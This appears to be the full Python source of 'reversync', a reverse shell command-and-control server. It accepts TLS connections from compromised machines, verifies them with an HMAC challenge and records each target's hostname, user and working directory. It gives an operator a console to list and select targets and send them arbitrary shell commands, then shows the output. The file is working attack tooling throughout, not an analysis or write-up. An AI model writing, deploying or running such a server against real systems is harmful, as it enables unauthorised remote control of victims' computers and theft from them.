import asyncio
import hashlib
import hmac
import secrets
import ssl
import json
import struct
import subprocess
import sys
from asyncio import CancelledError, IncompleteReadError
from interactiveconsole import InteractiveConsole
from targetsInfo import TargetInfo, Targets
from pathlib import Path


# Server configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1234
KEY_PATH = 'pswd'



def setup_data(data: bytes, address: str):
    jdata = json.loads(data)
    targets.info[address].cwd = jdata['cwd']
    targets.info[address].hostname = jdata['hostname']
    targets.info[address].username = jdata['username']
    return jdata


async def perform_hmac_challenge(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
    """
    Performs a basic HMAC-based challenge-response authentication with the client.

    Steps:
    1. Server generates a random challenge and sends it to the client.
    2. Client computes HMAC(challenge, shared_secret) and returns it.
    3. Server verifies it by computing the expected HMAC and comparing it securely.

    Returns:
        True if the client is authenticated successfully, False otherwise.
    """
    # Step 1: Generate a secure 64-byte challenge
    challenge = secrets.token_bytes(64)
    writer.write(challenge)
    await writer.drain()

    try:
        # Step 2: Wait for client's response (HMAC) with a timeout
        client_response = await asyncio.wait_for(reader.read(1024), timeout=60)
    except asyncio.TimeoutError:
        return False

    try:
        # Step 3: Read the shared secret from file
        with open(KEY_PATH, 'rb') as key_file:
            shared_secret = key_file.readline().strip()

        # Step 4: Generate expected HMAC using the shared secret and the original challenge
        expected_response = hmac.new(shared_secret, challenge, hashlib.sha256).digest()

        # Step 5: Securely compare client response with expected response
        return hmac.compare_digest(expected_response, client_response)

    except (FileNotFoundError, IOError):
        # Secret key file missing or unreadable
        return False


async def send(writer: asyncio.StreamWriter, data: bytes):
    """
    Sends command to the target.
    """
    length = struct.pack(">I", len(data))
    writer.write(length + data)
    await writer.drain()


async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """
    Handles an active reverse shell session with a connected client.

    Parameters:
    - reader: asyncio.StreamReader — used to read incoming data from the client.
    - writer: asyncio.StreamWriter — used to send data to the client.

    This function maintains a continuous session with a client,
    reading responses until the connection is closed or cancelled.
    """
    auth = await perform_hmac_challenge(reader, writer)
    if not auth:
        console.error = f"[-] Refuse the connection from {writer.get_extra_info('peername')}"
        writer.close()
        await writer.wait_closed()
        return None
    data = json.dumps({'status': 'accept'},indent=4).encode()
    await send(writer,data)
    client_address = writer.get_extra_info('peername')
    targets.connections[client_address] = writer
    targets.info[client_address] = TargetInfo(address=client_address)

    console.output = f"[+] Connection established from {client_address}. Type 'exit' to terminate session."

    try:
        while True:
            header = await reader.readexactly(4)
            length = struct.unpack(">I", header)[0]

            response = await reader.readexactly(length)
            response = setup_data(response, client_address)
            if client_address == targets.current_address:
                console.shell_prompt = targets.prompt
            if response['stdout']:
                console.output = response['stdout']
            if response['stderr']:
                console.error = response['stderr']

    except CancelledError as cancel_err:
        console.output = f"[-] Connection reader was cancelled: {cancel_err}"

    except IncompleteReadError:
        console.output = "[-] Target disconnected unexpectedly."
    finally:
        # Clean up on disconnection
        targets.delete(client_address)

        if client_address == targets.current_target:
            targets.current_target = ''
            console.clear()

        writer.close()
        await writer.wait_closed()
        console.output = "[-] Connection closed cleanly."


class TargetControlConsole:
    def __init__(self, shutdown_event: asyncio.Event):
        """
        Initializes the TargetControlConsole class for handling server-side shell interactions.

        Parameters:
        - shutdown_event: asyncio.Event — used to signal server shutdown.
        """
        self.shutdown_event = shutdown_event

    async def server_console(self):
        """
        Main interactive loop for the server-side console.
        Accepts commands from the operator and sends them to the selected client.
        """
        try:
            while True:
                command = await asyncio.get_running_loop().run_in_executor(None, console.b_input)

                if not command:
                    continue

                command_lower = command.lower().strip()

                if command_lower == "targets":
                    console.output = f'{targets}'
                    continue

                if command_lower == "help":
                    console.output = (
                        "Available Commands:\n"
                        " [+] exit                     - Exit from the current target session\n"
                        " [+] sysinfo                  - Retrieve system information from the target machine\n"
                        " [+] targets                  - List all connected machines\n"
                        " [+] select target <int>      - Select a target machine by its index\n"
                        " [+] clear                    - Clear the console output\n"
                        " [+] help                     - Show this help menu\n"
                        " [+] stop <int>               - Disconnect a target\n"
                        " [+] shutdown                 - Shut down the server and disconnect all targets\n"
                    )

                    continue

                if command_lower == "shutdown":
                    console.output = "[-] Closing connection and shutting down server..."
                    break

                if command_lower == "exit":
                    targets.current_target = ''
                    console.clear()
                    continue

                if command_lower == "clear":
                    subprocess.call("clear")
                    continue

                if not list(targets.connections):
                    console.output = '[-] No client has connected yet...'
                    continue

                if command_lower.startswith("stop "):
                    try:
                        index = int(command_lower.removeprefix("stop "))
                        addr = targets.get_target_address(index - 1)
                        targets.connections[addr].close()
                        await targets.connections[addr].wait_closed()
                        targets.delete(addr)
                    except (IndexError, ValueError):
                        console.output = "[-] Invalid target index."
                    continue

                if command_lower.startswith("select target "):
                    try:
                        index = int(command.removeprefix("select target "))
                        targets.change_target(index - 1)
                        console.shell_prompt = targets.prompt
                    except (IndexError, ValueError):
                        console.output = "[-] Invalid target index."
                    continue

                # If a client is selected, send the command
                if targets.current_address:
                    writer = targets.connections.get(targets.current_address)
                    if writer:
                        data = json.dumps({'cmd':command}).encode()
                        await send(writer,data)
                        #writer.write(command.encode())
                        #await writer.drain()
                    else:
                        console.output = "[-] Selected client is no longer connected."
                else:
                    console.output = '[-] Select a target using "select target <int>"'

        except CancelledError:
            console.output = '[-] Console task cancelled by asyncio.'

        finally:
            # Close all active connections
            for addr in list(targets.connections):
                targets.connections[addr].close()
                await targets.connections[addr].wait_closed()
                targets.delete(addr)

            self.shutdown_event.set()
            targets.current_target = ''
            console.clear()
            console.output = "[-] Server console shutdown complete."

def verify_files(cert:str,private_key:str,key:str):
    return all(Path(file).exists() for file in [cert,private_key,key])


async def run_reverse_shell_server():
    """
    Initializes and runs the reverse shell server.
    - Listens for incoming client connections on SERVER_HOST:SERVER_PORT.
    - Starts an interactive server console for operator input.
    - Waits for shutdown signal from the console to gracefully terminate.
    """
    shutdown_event = asyncio.Event()
    server_console = TargetControlConsole(shutdown_event)
    console_task = asyncio.create_task(server_console.server_console())

    # Small delay to ensure console starts before accepting connections
    await asyncio.sleep(0.1)
    ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
    try:
        # Try to bind to the specified host and port
        server = await asyncio.start_server(
            handle_reverse_shell_connection,
            SERVER_HOST,
            SERVER_PORT,
            reuse_address=True,  # optional but helpful on restarts
            ssl=ssl_ctx
        )
    except OSError as e:
        if e.errno == 98:
            console.error = f"[-] Port {SERVER_PORT} is already in use."
        elif e.errno == 13:
            console.error = f"[-] Permission denied: you need elevated privileges to bind to port {SERVER_PORT}."
        else:
            console.error = f"[-] Failed to start server: {e}"
        console_task.cancel()
        await asyncio.sleep(0.1)  # Give time for cancel to propagate
        console.exit()
        console.output = "[-] Reverse shell server terminated."
        return

    console.output = f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}"

    try:
        async with server:
            await shutdown_event.wait()  # Wait for the handler to signal shutdown
            console.output = "[-] Shutdown signal received. Closing server..."
            server.close()
            await server.wait_closed()

    except CancelledError as cancel_err:
        if not server.is_serving():
            server.close()
            await server.wait_closed()
        console.output = f"[-] Server shutdown requested. {cancel_err}"

    finally:
        console_task.cancel()
        await asyncio.sleep(0.1)  # Give time for cancel to propagate
        console.exit()
        console.output = "[-] Reverse shell server terminated."


# Entry point for starting the reverse shell server

if __name__ == "__main__":
    # Initialize target manager and main console instance
    targets = Targets()
    console = InteractiveConsole("reversync")

    if not verify_files('cert.pem','key.pem','pswd'):
        console.error = 'verify the files'
        sys.exit(0)

    try:
        asyncio.run(run_reverse_shell_server())
    except OSError as e:
        # Handles binding errors and general socket issues
        error_message = e.strerror if e.strerror else str(e)
        console.output = f"[-] OS Error: {error_message}"
    except KeyboardInterrupt:
        # Clean shutdown on Ctrl+C
        console.output = "[-] Interrupted by user. Closing connection."
    except Exception as e:
        # Catch-all for unexpected errors
        console.output = f"[-] Unexpected error: {type(e).__name__}: {e}"
